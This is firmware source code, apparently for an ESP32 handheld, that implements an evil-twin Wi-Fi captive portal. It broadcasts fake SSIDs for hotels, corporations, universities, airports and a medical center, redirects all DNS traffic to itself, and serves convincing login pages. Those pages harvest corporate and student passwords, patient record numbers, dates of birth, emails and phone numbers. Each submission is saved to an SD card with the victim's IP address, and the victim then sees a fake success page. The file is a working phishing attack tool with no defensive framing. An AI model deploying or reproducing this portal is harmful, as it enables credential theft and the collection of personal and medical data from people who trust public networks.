#include "CaptivePortal.h"
#include "SDCardManager.h"
#include "esp_wifi.h"

// Initialize static member
IPAddress CaptivePortal::APIP(192, 168, 4, 1);

// Template names and SSIDs
const char* TEMPLATE_NAMES[] = {
  "Hotel/Guest",
  "Coffee Shop",
  "Corporate",
  "Airport",
  "Library",
  "Conference",
  "Retail",
  "Device Setup",
  "University",
  "Medical"
};

const char* TEMPLATE_SSIDS[] = {
  "GrandHotel_FreeWiFi",
  "BeanAndBrew_WiFi",
  "ACME_Corp_Secure",
  "SkyLink_Airport",
  "CityLibrary_Free",
  "TechSummit2024",
  "TechZone_WiFi",
  "SmartHome_Setup",
  "MetroU_Campus",
  "Wellness_Medical"
};

// Template HTML pages (simplified, mobile-friendly versions)
const char* TEMPLATE_HTML[] = {
  // TEMPLATE_HOTEL
  R"rawliteral(
<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
<title>Grand Hotel - Free WiFi</title><style>
body{font-family:Arial;background:linear-gradient(135deg,#1a5276,#2e86ab);min-height:100vh;margin:0;display:flex;align-items:center;justify-content:center}
.container{background:white;border-radius:12px;padding:30px;max-width:360px;width:90%;box-shadow:0 10px 40px rgba(0,0,0,0.3)}
h1{color:#1a5276;margin:0 0 5px;text-align:center;font-size:22px}
.subtitle{color:#666;text-align:center;margin-bottom:20px;font-size:13px}
.logo{text-align:center;font-size:32px;margin-bottom:15px}🏨
label{color:#333;font-weight:600;display:block;margin-bottom:6px;font-size:13px}
input{width:100%;padding:12px;border:2px solid #ddd;border-radius:6px;font-size:15px;box-sizing:border-box;margin-bottom:15px}
button{width:100%;padding:14px;background:#1a5276;color:white;border:none;border-radius:6px;font-size:15px;cursor:pointer}
button:hover{background:#2471a3}
.terms{font-size:11px;color:#888;text-align:center;margin-top:15px}
</style></head><body>
<div class=container>
<div class=logo>🏨</div>
<h1>Grand Hotel</h1>
<p class=subtitle>Free WiFi Access for Guests</p>
<form action=/post method=post>
<label>Room Number:</label><input type=text name=room placeholder="e.g. 302">
<label>Last Name:</label><input type=text name=name placeholder="Guest surname">
<button type=submit>Connect to WiFi</button>
</form>
<p class=terms>By connecting, you agree to our Terms of Service</p>
</div></body></html>
)rawliteral",
  
  // TEMPLATE_COFFEE
  R"rawliteral(
<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
<title>Bean & Brew - Free WiFi</title><style>
body{font-family:Arial;background:linear-gradient(135deg,#6f4e37,#8b5a2b);min-height:100vh;margin:0;display:flex;align-items:center;justify-content:center}
.container{background:white;border-radius:12px;padding:30px;max-width:360px;width:90%;box-shadow:0 10px 40px rgba(0,0,0,0.3)}
h1{color:#6f4e37;margin:0 0 5px;text-align:center;font-size:20px}
.subtitle{color:#888;text-align:center;margin-bottom:20px;font-size:13px}
.logo{text-align:center;font-size:32px;margin-bottom:15px}☕
label{color:#333;font-weight:600;display:block;margin-bottom:6px;font-size:13px}
input{width:100%;padding:12px;border:2px solid #ddd;border-radius:6px;font-size:15px;box-sizing:border-box;margin-bottom:15px}
button{width:100%;padding:14px;background:#6f4e37;color:white;border:none;border-radius:6px;font-size:15px;cursor:pointer}
button:hover{background:#5d4037}
.terms{font-size:11px;color:#888;text-align:center;margin-top:15px}
</style></head><body>
<div class=container>
<div class=logo>☕</div>
<h1>Bean & Brew</h1>
<p class=subtitle>Free WiFi for Customers</p>
<form action=/post method=post>
<label>Email Address:</label><input type=email name=email placeholder="your@email.com">
<label>Device Name (optional):</label><input type=text name=device placeholder="e.g. iPhone">
<button type=submit>Get WiFi Access</button>
</form>
<p class=terms>Subscribe to our newsletter for 10% off!</p>
</div></body></html>
)rawliteral",
  
  // TEMPLATE_CORPORATE
  R"rawliteral(
<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
<title>ACME Corp - Secure Network</title><style>
body{font-family:Arial;background:linear-gradient(135deg,#2c3e50,#34495e);min-height:100vh;margin:0;display:flex;align-items:center;justify-content:center}
.container{background:white;border-radius:12px;padding:30px;max-width:360px;width:90%;box-shadow:0 10px 40px rgba(0,0,0,0.3)}
h1{color:#2c3e50;margin:0 0 5px;text-align:center;font-size:20px}
.subtitle{color:#888;text-align:center;margin-bottom:20px;font-size:13px}
.logo{text-align:center;font-size:32px;margin-bottom:15px}🏢
label{color:#333;font-weight:600;display:block;margin-bottom:6px;font-size:13px}
input{width:100%;padding:12px;border:2px solid #ddd;border-radius:6px;font-size:15px;box-sizing:border-box;margin-bottom:15px}
button{width:100%;padding:14px;background:#2c3e50;color:white;border:none;border-radius:6px;font-size:15px;cursor:pointer}
button:hover{background:#1a252f}
.terms{font-size:11px;color:#888;text-align:center;margin-top:15px}
</style></head><body>
<div class=container>
<div class=logo>🏢</div>
<h1>ACME Corporation</h1>
<p class=subtitle>Employee & Guest WiFi Access</p>
<form action=/post method=post>
<label>Employee ID:</label><input type=text name=empid placeholder="e.g. EMP12345">
<label>Password:</label><input type=password name=pass placeholder="Corporate password">
<button type=submit>Authenticate</button>
</form>
<p class=terms>Authorized personnel only. Access is monitored.</p>
</div></body></html>
)rawliteral",
  
  // TEMPLATE_AIRPORT
  R"rawliteral(
<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
<title>SkyLink Airport - Free WiFi</title><style>
body{font-family:Arial;background:linear-gradient(135deg,#1e3c72,#2a5298);min-height:100vh;margin:0;display:flex;align-items:center;justify-content:center}
.container{background:white;border-radius:12px;padding:30px;max-width:360px;width:90%;box-shadow:0 10px 40px rgba(0,0,0,0.3)}
h1{color:#1e3c72;margin:0 0 5px;text-align:center;font-size:20px}
.subtitle{color:#888;text-align:center;margin-bottom:20px;font-size:13px}
.logo{text-align:center;font-size:32px;margin-bottom:15px}✈️
label{color:#333;font-weight:600;display:block;margin-bottom:6px;font-size:13px}
input{width:100%;padding:12px;border:2px solid #ddd;border-radius:6px;font-size:15px;box-sizing:border-box;margin-bottom:15px}
button{width:100%;padding:14px;background:#1e3c72;color:white;border:none;border-radius:6px;font-size:15px;cursor:pointer}
button:hover{background:#16325c}
.terms{font-size:11px;color:#888;text-align:center;margin-top:15px}
</style></head><body>
<div class=container>
<div class=logo>✈️</div>
<h1>SkyLink Airport</h1>
<p class=subtitle>Free WiFi - 60 min included</p>
<form action=/post method=post>
<label>Flight Number:</label><input type=text name=flight placeholder="e.g. UA123">
<label>Destination:</label><input type=text name=dest placeholder="e.g. Los Angeles">
<button type=submit>Connect to WiFi</button>
</form>
<p class=terms>Premium speeds available for purchase</p>
</div></body></html>
)rawliteral",
  
  // TEMPLATE_LIBRARY
  R"rawliteral(
<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
<title>City Library - Free WiFi</title><style>
body{font-family:Arial;background:linear-gradient(135deg,#4a235a,#6c3483);min-height:100vh;margin:0;display:flex;align-items:center;justify-content:center}
.container{background:white;border-radius:12px;padding:30px;max-width:360px;width:90%;box-shadow:0 10px 40px rgba(0,0,0,0.3)}
h1{color:#4a235a;margin:0 0 5px;text-align:center;font-size:20px}
.subtitle{color:#888;text-align:center;margin-bottom:20px;font-size:13px}
.logo{text-align:center;font-size:32px;margin-bottom:15px}📚
label{color:#333;font-weight:600;display:block;margin-bottom:6px;font-size:13px}
input{width:100%;padding:12px;border:2px solid #ddd;border-radius:6px;font-size:15px;box-sizing:border-box;margin-bottom:15px}
button{width:100%;padding:14px;background:#4a235a;color:white;border:none;border-radius:6px;font-size:15px;cursor:pointer}
button:hover{background:#3b1c4a}
.terms{font-size:11px;color:#888;text-align:center;margin-top:15px}
</style></head><body>
<div class=container>
<div class=logo>📚</div>
<h1>City Library</h1>
<p class=subtitle>Free WiFi for Patrons</p>
<form action=/post method=post>
<label>Library Card #:</label><input type=text name=card placeholder="e.g. LIB123456">
<label>Name:</label><input type=text name=name placeholder="Your name">
<button type=submit>Access WiFi</button>
</form>
<p class=terms>Internet use is filtered. 3hr daily limit.</p>
</div></body></html>
)rawliteral",
  
  // TEMPLATE_CONFERENCE
  R"rawliteral(
<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
<title>Tech Summit 2024 - WiFi</title><style>
body{font-family:Arial;background:linear-gradient(135deg,#0b5345,#148f77);min-height:100vh;margin:0;display:flex;align-items:center;justify-content:center}
.container{background:white;border-radius:12px;padding:30px;max-width:360px;width:90%;box-shadow:0 10px 40px rgba(0,0,0,0.3)}
h1{color:#0b5345;margin:0 0 5px;text-align:center;font-size:18px}
.subtitle{color:#888;text-align:center;margin-bottom:20px;font-size:13px}
.logo{text-align:center;font-size:32px;margin-bottom:15px}🎤
label{color:#333;font-weight:600;display:block;margin-bottom:6px;font-size:13px}
input{width:100%;padding:12px;border:2px solid #ddd;border-radius:6px;font-size:15px;box-sizing:border-box;margin-bottom:15px}
button{width:100%;padding:14px;background:#0b5345;color:white;border:none;border-radius:6px;font-size:15px;cursor:pointer}
button:hover{background:#0a4538}
.terms{font-size:11px;color:#888;text-align:center;margin-top:15px}
</style></head><body>
<div class=container>
<div class=logo>🎤</div>
<h1>Tech Summit 2024</h1>
<p class=subtitle>Conference WiFi Access</p>
<form action=/post method=post>
<label>Badge/Attendee ID:</label><input type=text name=badge placeholder="e.g. TS-12345">
<label>Company:</label><input type=text name=company placeholder="Your company">
<button type=submit>Join Network</button>
</form>
<p class=terms>Exclusive to registered attendees</p>
</div></body></html>
)rawliteral",
  
  // TEMPLATE_RETAIL
  R"rawliteral(
<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
<title>TechZone - Guest WiFi</title><style>
body{font-family:Arial;background:linear-gradient(135deg,#7b241c,#a93226);min-height:100vh;margin:0;display:flex;align-items:center;justify-content:center}
.container{background:white;border-radius:12px;padding:30px;max-width:360px;width:90%;box-shadow:0 10px 40px rgba(0,0,0,0.3)}
h1{color:#7b241c;margin:0 0 5px;text-align:center;font-size:20px}
.subtitle{color:#888;text-align:center;margin-bottom:20px;font-size:13px}
.logo{text-align:center;font-size:32px;margin-bottom:15px}🛒
label{color:#333;font-weight:600;display:block;margin-bottom:6px;font-size:13px}
input{width:100%;padding:12px;border:2px solid #ddd;border-radius:6px;font-size:15px;box-sizing:border-box;margin-bottom:15px}
button{width:100%;padding:14px;background:#7b241c;color:white;border:none;border-radius:6px;font-size:15px;cursor:pointer}
button:hover{background:#641e16}
.terms{font-size:11px;color:#888;text-align:center;margin-top:15px}
</style></head><body>
<div class=container>
<div class=logo>🛒</div>
<h1>TechZone</h1>
<p class=subtitle>Free WiFi for Shoppers</p>
<form action=/post method=post>
<label>Phone Number:</label><input type=tel name=phone placeholder="(555) 123-4567">
<label>Email:</label><input type=email name=email placeholder="your@email.com">
<button type=submit>Get Connected</button>
</form>
<p class=terms>Get exclusive deals via text!</p>
</div></body></html>
)rawliteral",
  
  // TEMPLATE_DEVICE
  R"rawliteral(
<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
<title>SmartHome Setup - WiFi</title><style>
body{font-family:Arial;background:linear-gradient(135deg,#1a5276,#2874a6);min-height:100vh;margin:0;display:flex;align-items:center;justify-content:center}
.container{background:white;border-radius:12px;padding:30px;max-width:360px;width:90%;box-shadow:0 10px 40px rgba(0,0,0,0.3)}
h1{color:#1a5276;margin:0 0 5px;text-align:center;font-size:18px}
.subtitle{color:#888;text-align:center;margin-bottom:20px;font-size:13px}
.logo{text-align:center;font-size:32px;margin-bottom:15px}🏠
label{color:#333;font-weight:600;display:block;margin-bottom:6px;font-size:13px}
input{width:100%;padding:12px;border:2px solid #ddd;border-radius:6px;font-size:15px;box-sizing:border-box;margin-bottom:15px}
button{width:100%;padding:14px;background:#1a5276;color:white;border:none;border-radius:6px;font-size:15px;cursor:pointer}
button:hover{background:#154360}
.terms{font-size:11px;color:#888;text-align:center;margin-top:15px}
</style></head><body>
<div class=container>
<div class=logo>🏠</div>
<h1>SmartHome Setup</h1>
<p class=subtitle>Connect Your Device</p>
<form action=/post method=post>
<label>Device Name:</label><input type=text name=device placeholder="e.g. Living Room Hub">
<label>Room Location:</label><input type=text name=room placeholder="e.g. Living Room">
<button type=submit>Configure Device</button>
</form>
<p class=terms>Setup your smart home device</p>
</div></body></html>
)rawliteral",
  
  // TEMPLATE_UNIVERSITY
  R"rawliteral(
<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
<title>MetroU Campus WiFi</title><style>
body{font-family:Arial;background:linear-gradient(135deg,#17202a,#212f3c);min-height:100vh;margin:0;display:flex;align-items:center;justify-content:center}
.container{background:white;border-radius:12px;padding:30px;max-width:360px;width:90%;box-shadow:0 10px 40px rgba(0,0,0,0.3)}
h1{color:#17202a;margin:0 0 5px;text-align:center;font-size:20px}
.subtitle{color:#888;text-align:center;margin-bottom:20px;font-size:13px}
.logo{text-align:center;font-size:32px;margin-bottom:15px}🎓
label{color:#333;font-weight:600;display:block;margin-bottom:6px;font-size:13px}
input{width:100%;padding:12px;border:2px solid #ddd;border-radius:6px;font-size:15px;box-sizing:border-box;margin-bottom:15px}
button{width:100%;padding:14px;background:#17202a;color:white;border:none;border-radius:6px;font-size:15px;cursor:pointer}
button:hover{background:#0d1318}
.terms{font-size:11px;color:#888;text-align:center;margin-top:15px}
</style></head><body>
<div class=container>
<div class=logo>🎓</div>
<h1>Metro University</h1>
<p class=subtitle>Campus WiFi Access</p>
<form action=/post method=post>
<label>Student ID:</label><input type=text name=student placeholder="e.g. S12345678">
<label>Password:</label><input type=password name=pass placeholder="Student password">
<button type=submit>Login to Campus WiFi</button>
</form>
<p class=terms>Use your university credentials</p>
</div></body></html>
)rawliteral",
  
  // TEMPLATE_MEDICAL
  R"rawliteral(
<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
<title>Wellness Medical - WiFi</title><style>
body{font-family:Arial;background:linear-gradient(135deg,#1b4f72,#2874a6);min-height:100vh;margin:0;display:flex;align-items:center;justify-content:center}
.container{background:white;border-radius:12px;padding:30px;max-width:360px;width:90%;box-shadow:0 10px 40px rgba(0,0,0,0.3)}
h1{color:#1b4f72;margin:0 0 5px;text-align:center;font-size:18px}
.subtitle{color:#888;text-align:center;margin-bottom:20px;font-size:13px}
.logo{text-align:center;font-size:32px;margin-bottom:15px}🏥
label{color:#333;font-weight:600;display:block;margin-bottom:6px;font-size:13px}
input{width:100%;padding:12px;border:2px solid #ddd;border-radius:6px;font-size:15px;box-sizing:border-box;margin-bottom:15px}
button{width:100%;padding:14px;background:#1b4f72;color:white;border:none;border-radius:6px;font-size:15px;cursor:pointer}
button:hover{background:#154360}
.terms{font-size:11px;color:#888;text-align:center;margin-top:15px}
</style></head><body>
<div class=container>
<div class=logo>🏥</div>
<h1>Wellness Medical Center</h1>
<p class=subtitle>Patient & Visitor WiFi</p>
<form action=/post method=post>
<label>Patient MRN:</label><input type=text name=mrn placeholder="e.g. MRN123456">
<label>Date of Birth:</label><input type=text name=dob placeholder="MM/DD/YYYY">
<button type=submit>Access WiFi</button>
</form>
<p class=terms>WiFi available in waiting areas only</p>
</div></body></html>
)rawliteral"
};

void CaptivePortal::begin() {
  Serial.println("Starting Captive Portal");
  _active = true;
  _portalScreen = PORTAL_SCREEN_MENU;
  _menuIndex = 0;
  _dirty = true;
  
  // Clear captures
  memset(_captures, 0, sizeof(_captures));
  _captureCount = 0;
  _captureIndex = 0;
  
  // Start AP with selected template SSID
  currentSSID = TEMPLATE_SSIDS[_template];
  WiFi.mode(WIFI_AP);
  WiFi.softAP(currentSSID.c_str());
  
  Serial.print("AP SSID: ");
  Serial.println(currentSSID);
  Serial.print("AP IP: ");
  Serial.println(WiFi.softAPIP());
  
  setupServers();
  
  // Reset activity timer
  _lastActivity = millis();
}

void CaptivePortal::setupServers() {
  dnsServer.start(DNS_PORT, "*", APIP);
  
  webServer.on("/", [this]() { handleRoot(); });
  webServer.on("/post", HTTP_POST, [this]() { handlePost(); });
  webServer.on("/clear", [this]() { handleClear(); });
  webServer.onNotFound([this]() { handleRoot(); });
  
  webServer.begin();
}

void CaptivePortal::update(DisplayPort &display) {
  _display = &display;
  
  // Handle DNS and web server requests
  if (_active) {
    dnsServer.processNextRequest();
    webServer.handleClient();
    
    // Handle timeout (30 minutes)
    if (millis() - _lastActivity > 1800000UL) {
      stop();
      return;
    }
  }
  
  // Handle periodic tick
  if (millis() - _lastTick >= 1000) {
    _tickCtr++;
    _lastTick = millis();
  }
  
  // Render based on current screen
  switch (_portalScreen) {
    case PORTAL_SCREEN_MENU:
      renderMenu(display);
      break;
    case PORTAL_SCREEN_STATUS:
      renderStatus(display);
      break;
    case PORTAL_SCREEN_CAPTURES:
      renderCaptures(display);
      break;
  }
  
  _dirty = false;
}

void CaptivePortal::renderMenu(DisplayPort &display) {
  Adafruit_GFX &gfx = display.gfx();
  display.clear();
  display.drawHeader("Captive Portal");
  
  // Template list (show 3 visible items)
  const int VISIBLE_ITEMS = 4;
  int startIdx = max(0, min(_menuIndex - 1, TEMPLATE_COUNT - VISIBLE_ITEMS));
  
  gfx.setTextSize(1);
  for (int i = 0; i < VISIBLE_ITEMS && (startIdx + i) < TEMPLATE_COUNT; i++) {
    int idx = startIdx + i;
    int y = 25 + (i * 14);
    
    if (idx == _menuIndex) {
      gfx.fillRect(2, y - 2, 156, 13, ST77XX_BLUE);
      gfx.setTextColor(ST77XX_WHITE);
    } else {
      gfx.setTextColor(ST77XX_WHITE);
    }
    
    gfx.setCursor(8, y);
    gfx.print(TEMPLATE_NAMES[idx]);
    
    // Show selected indicator
    if (idx == _template) {
      gfx.setCursor(145, y);
      gfx.print("*");
    }
  }
  
  display.drawFooter("Up/Dn:Select  C:Launch  5s:Back");
}

void CaptivePortal::renderStatus(DisplayPort &display) {
  Adafruit_GFX &gfx = display.gfx();
  display.clear();
  display.drawHeader("Portal Active");
  
  gfx.setTextSize(1);
  gfx.setTextColor(ST77XX_WHITE);
  
  gfx.setCursor(10, 25);
  gfx.print("SSID: ");
  gfx.print(currentSSID);
  
  gfx.setCursor(10, 40);
  gfx.print("IP: ");
  gfx.print(WiFi.softAPIP().toString());
  
  gfx.setCursor(10, 55);
  gfx.print("Captured: ");
  gfx.print(_captureCount);
  
  gfx.setCursor(10, 70);
  gfx.print("Uptime: ");
  gfx.print(_tickCtr / 60);
  gfx.print("m");
  
  // Connected clients info
  // Client count via softAPgetStationNum
  uint8_t clientCount = WiFi.softAPgetStationNum();
  gfx.setCursor(10, 85);
  gfx.print("Clients: ");
  gfx.print(clientCount);
  
  display.drawFooter("C:Menu  5s:Stop");
}

void CaptivePortal::renderCaptures(DisplayPort &display) {
  Adafruit_GFX &gfx = display.gfx();
  display.clear();
  display.drawHeader("Captures");
  
  gfx.setTextSize(1);
  gfx.setTextColor(ST77XX_WHITE);
  
  gfx.setCursor(10, 25);
  gfx.print("Total: ");
  gfx.print(_captureCount);
  gfx.print(" / ");
  gfx.print(CAPTURE_MAX);
  
  // Show last capture
  if (_captureCount > 0) {
    int idx = (_captureIndex + CAPTURE_MAX - 1) % CAPTURE_MAX;
    String data(_captures[idx].data);
    
    // Truncate for display
    if (data.length() > 28) {
      data = data.substring(0, 28);
    }
    
    gfx.setCursor(10, 45);
    gfx.print("Last: ");
    gfx.print(data);
  }
  
  display.drawFooter("C:Menu");
}

void CaptivePortal::stop() {
  Serial.println("Stopping Captive Portal");
  
  dnsServer.stop();
  webServer.stop();
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_OFF);
  
  _active = false;
  _portalScreen = PORTAL_SCREEN_MENU;
}

bool CaptivePortal::active() const {
  return _active;
}

void CaptivePortal::handleRoot() {
  _lastActivity = millis();
  webServer.send(HTTP_CODE, "text/html", getHtmlTemplate());
}

void CaptivePortal::handlePost() {
  _lastActivity = millis();

  // Capture all form data
  String data = "POST:";
  for (int i = 0; i < webServer.args(); i++) {
    if (i > 0) data += " | ";
    data += webServer.argName(i) + "=" + webServer.arg(i);
  }

  // Get client IP address
  IPAddress clientIP = webServer.client().remoteIP();
  char ipAddress[20];
  snprintf(ipAddress, sizeof(ipAddress), "%d.%d.%d.%d",
           clientIP[0], clientIP[1], clientIP[2], clientIP[3]);

  captureData(data, ipAddress);
  
  // Show success page
  String resp = R"rawliteral(
<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
<title>Connected</title><style>
body{font-family:Arial;background:#1a5276;min-height:100vh;margin:0;display:flex;align-items:center;justify-content:center}
.container{background:white;border-radius:12px;padding:40px;text-align:center;max-width:360px}
h1{color:#1a5276;margin:0}✅</style></head><body>
<div class=container><h1>✅</h1><h2>You're Connected!</h2>
<p>Enjoy your free WiFi access.</p></div></body></html>
)rawliteral";
  
  webServer.send(HTTP_CODE, "text/html", resp);
}

void CaptivePortal::handleClear() {
  _lastActivity = millis();
  _captureCount = 0;
  _captureIndex = 0;
  memset(_captures, 0, sizeof(_captures));
  
  String resp = R"rawliteral(
<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
<title>Cleared</title><style>
body{font-family:Arial;background:#6c3483;min-height:100vh;margin:0;display:flex;align-items:center;justify-content:center}
.container{background:white;border-radius:12px;padding:40px;text-align:center;max-width:360px}
h1{color:#6c3483;margin:0}🗑️</style></head><body>
<div class=container><h1>🗑️</h1><h2>Data Cleared</h2>
<p>All captured data has been reset.</p></div></body></html>
)rawliteral";
  
  webServer.send(HTTP_CODE, "text/html", resp);
}

void CaptivePortal::captureData(const String& data, const char* ipAddress) {
  unsigned long timestamp = millis();

  // Write to SD card if available
  if (SDCardManager::instance().isAvailable()) {
    SDCardManager::instance().writeCapture("/captures", getTemplateName(),
                                          data.c_str(), timestamp, ipAddress);
  }

  // Store in RAM circular buffer for live display
  if (data.length() >= CAPTURE_LEN) {
    // Truncate if needed
    strncpy(_captures[_captureIndex].data, data.c_str(), CAPTURE_LEN - 1);
    _captures[_captureIndex].data[CAPTURE_LEN - 1] = '\0';
  } else {
    strcpy(_captures[_captureIndex].data, data.c_str());
  }
  _captures[_captureIndex].timestamp = timestamp;

  _captureIndex = (_captureIndex + 1) % CAPTURE_MAX;
  if (_captureCount < CAPTURE_MAX) {
    _captureCount++;
  }

  Serial.print("Captured: ");
  Serial.println(data);
}

String CaptivePortal::input(String argName) {
  String a = webServer.arg(argName);
  a.replace("<", "&lt;");
  a.replace(">", "&gt;");
  if (a.length() > 200) a = a.substring(0, 200);
  return a;
}

String CaptivePortal::footer() {
  return "</div><div class=q><a>&#169; All rights reserved.</a></div>";
}

String CaptivePortal::header(String t) {
  String a = currentSSID;
  String CSS = "article{background:#f2f2f2;padding:1.3em}body{color:#333;font-family:Century Gothic,sans-serif;font-size:18px;line-height:24px;margin:0;padding:0}"
               "div{padding:0.5em}h1{margin:0.5em 0 0 0;padding:0.5em}input{width:100%;padding:9px 10px;margin:8px 0;box-sizing:border-box;border-radius:0;border:1px solid #555;border-radius:10px}"
               "label{color:#333;display:block;font-style:italic;font-weight:bold}nav{background:#0066ff;color:#fff;display:flex;align-items:center}"
               ".q{background:#e0e0e0;text-align:center}a{color:#0066ff}";
  String h = "<!DOCTYPE html><html><head><title>" + a + " :: " + t + "</title>"
             "<meta name=viewport content='width=device-width,initial-scale=1'>"
             "<style>" + CSS + "</style>"
             "<meta charset='UTF-8'></head>"
             "<body><nav><b>" + a + "</b></nav><div><h1>" + t + "</h1></div><div>";
  return h;
}

String CaptivePortal::generateIndex() {
  return header(String("WiFi Access")) + "<p>Please fill in the form below to connect.</p>"
         "<form action=/post method=post><label>Name:</label><input type=text name=name>"
         "<input type=submit value='Connect'></form>" + footer();
}

String CaptivePortal::generatePosted() {
  return header(String("Connected")) + "<p>You are now connected to the internet.</p>"
         "<p><a href=/>Back to home</a></p>" + footer();
}

String CaptivePortal::generateClear() {
  _captureCount = 0;
  _captureIndex = 0;
  memset(_captures, 0, sizeof(_captures));
  return header(String("Cleared")) + "<p>All data has been cleared.</p>"
         "<p><a href=/>Back to home</a></p>" + footer();
}

const char* CaptivePortal::getTemplateName() const {
  return TEMPLATE_NAMES[_template];
}

const char* CaptivePortal::getTemplateSSID() const {
  return TEMPLATE_SSIDS[_template];
}

String CaptivePortal::getHtmlTemplate() const {
  if (_template >= 0 && _template < TEMPLATE_COUNT) {
    return String(TEMPLATE_HTML[_template]);
  }
  return String(TEMPLATE_HTML[0]);
}

const char* CaptivePortal::getCaptureData(int idx) const {
  if (idx < 0 || idx >= _captureCount) return nullptr;
  int actualIdx = (_captureIndex + CAPTURE_MAX - _captureCount + idx) % CAPTURE_MAX;
  return _captures[actualIdx].data;
}
